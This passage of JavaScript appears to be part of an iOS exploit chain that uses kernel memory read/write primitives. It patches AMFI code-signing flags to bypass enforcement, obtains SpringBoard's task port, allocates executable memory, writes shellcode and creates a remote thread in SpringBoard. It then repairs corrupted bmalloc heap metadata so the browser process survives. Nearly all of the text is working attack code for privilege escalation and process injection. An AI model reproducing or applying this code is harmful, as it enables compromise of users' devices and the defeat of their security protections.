                  let verify = uread64(kc_addr);
                  LOG(`[A2] After write: ${verify.hex()}`);
                  if (verify != cur) a2_success = true;
              }
          }

          // --- Approach 3: amfi_flags ---
          if (!a2_success) {
              let af_addr = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "amfi_flags");
              if (af_addr.noPAC() != 0n) {
                  let kc_addr = af_addr.noPAC();
                  let cur = uread64(kc_addr);
                  LOG(`[A2] amfi_flags current = ${cur.hex()}`);
                  uwrite64(kc_addr, cur | 1n);
                  let verify = uread64(kc_addr);
                  if (verify != cur) a2_success = true;
              }
          }

          // --- Retry task_for_pid if AMFI was patched ---
          if (a2_success) {
              LOG("[A2] AMFI bypass applied, retrying task_for_pid...");
              let sb_port_buf = mpd_malloc(8n);
              mpd_write64(sb_port_buf, 0n);
              let tfp2 = mpd_fcall_timeout(task_for_pid_raw.noPAC(), mpd_task_self, sb_pid_for_m6, sb_port_buf, 0n, 0n, 0n, 0n, 0n);
              if (tfp2 === MPD_FCALL_TIMED_OUT) {
                LOG("[A2] task_for_pid timed out after AMFI patch");
                tfp2 = -1n;
              }
              LOG(`[A2] task_for_pid after AMFI patch = ${tfp2}`);
              if (tfp2 == 0n) {
                  let sb_port = mpd_read64(sb_port_buf);
                  LOG(`[A2] SpringBoard task port = ${sb_port.hex()}`);
                  // Continue with existing M6/M7 injection code using sb_port
                  // Re-use the vm_allocate/vm_write/thread_create block from above
                  const VM_FLAGS_ANYWHERE = 1n;
                  const VM_PROT_ALL = 0x7n;
                  let alloc_addr_buf = mpd_malloc(8n);
                  let vm_alloc_ret = mpd_fcall_timeout(mach_vm_allocate_raw.noPAC(), sb_port, alloc_addr_buf, 0x4000n /*16KB*/, VM_FLAGS_ANYWHERE, 0n, 0n, 0n, 0n);
                  let sb_remote_addr = mpd_read64(alloc_addr_buf);
                  LOG(`[A2-M6] mach_vm_allocate = ${vm_alloc_ret} addr=${sb_remote_addr.hex()}`);
                  if (vm_alloc_ret == 0n && sb_remote_addr != 0n) {
                      let shellcode_addr = mpd_malloc(8n);
                      mpd_write64(shellcode_addr, 0xD65F03C014000000n); // ret then b #0
                      let vm_write_ret = mpd_fcall_timeout(mach_vm_write_raw.noPAC(), sb_port, sb_remote_addr, shellcode_addr, 8n, 0n, 0n, 0n, 0n);
                      LOG(`[A2-M6] mach_vm_write = ${vm_write_ret}`);
                      if (mach_vm_protect_raw != 0n) {
                          let vm_prot_ret = mpd_fcall_timeout(mach_vm_protect_raw.noPAC(), sb_port, sb_remote_addr, 0x4000n, 0n, VM_PROT_ALL, 0n, 0n, 0n);
                          LOG(`[A2-M6] mach_vm_protect(rwx) = ${vm_prot_ret}`);
                      }
                      uwrite64(surface_address + 0xF878n, sb_remote_addr);
                      uwrite64(surface_address + 0xF880n, sb_port);
                      LOG("[A2-M6] SpringBoard injection prepared");

                      // ===== M7: Create remote thread =====
                      let thread_create_running_raw = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "thread_create_running");
                      if (thread_create_running_raw != 0n) {
                          let thread_port_buf = mpd_malloc(8n);
                          mpd_write64(thread_port_buf, 0n);
                          let thread_ret = mpd_fcall_timeout(thread_create_running_raw.noPAC(), sb_port, sb_remote_addr, 0n /*arg*/, thread_port_buf, 0n, 0n, 0n, 0n);
                          let sb_thread_port = mpd_read64(thread_port_buf);
                          LOG(`[A2-M7] thread_create_running = ${thread_ret} thread_port=${sb_thread_port.hex()}`);
                          if (thread_ret == 0n) {
                              LOG("[A2-M7] SUCCESS: Remote thread created in SpringBoard!");
                              uwrite64(surface_address + 0xF888n, sb_thread_port);
                          } else {
                              LOG("[A2-M7] thread_create_running failed");
                              uwrite64(surface_address + 0xF888n, 0n);
                          }
                      }
                  }
              } else {
                  LOG(`[A2] task_for_pid still fails (${tfp2}), AMFI patch may have COW issue`);
              }
          } else {
              LOG("[A2] All gpuDlsym approaches returned NULL -- falling through to Phase B");
              // Fall through to Phase B (mach_vm_read based kernel traversal)
              // This would be implemented if Step 4 diagnostic shows mach_vm_read works
          }
        }
      } else {
        LOG("[M6] Cannot resolve task_for_pid or mach_task_self in MPD");
      }
    } else {
      LOG("[M6] SpringBoard task NOT found, injection skipped");
    }
    } // end else (A2 fast path check)
  }
  LOG("closing remaker_connection: " + remaker_connection);
  LOG("Before xpc_connection_cancel");
  xpc_connection_cancel(remaker_connection);
  LOG("After xpc_connection_cancel, waiting for PE logs");
  LOG("pe_log_buf=" + pe_log_buf + " pe_log_buf_off=" + pe_log_buf_off + " globalDLSYM=" + globalDLSYM);
  sbx1_end = Date.now();
  // Restore bmalloc metadata before returning from eval, otherwise JS GC
  // touches corrupted emptyString metadata and crashes before sbx0 can fix it
  LOG("Restoring bmalloc metadata after emptyString Corruption");
  uwrite64(offsets.emptyString + 0x68n, 0x300000005n);
  uwrite64(offsets.emptyString + 0x70n, 0x100000080n);
  uwrite64(offsets.emptyString + 0x78n, 0n);
  uwrite64(offsets.emptyString + 0x80n, 0x1200000001n);
  LOG("bmalloc metadata restored");
  LOG("ALL DONE!");
  LOG("Calling _exit() from sbx1");
  wc_fcall(offsets.exit, 0n);
})();
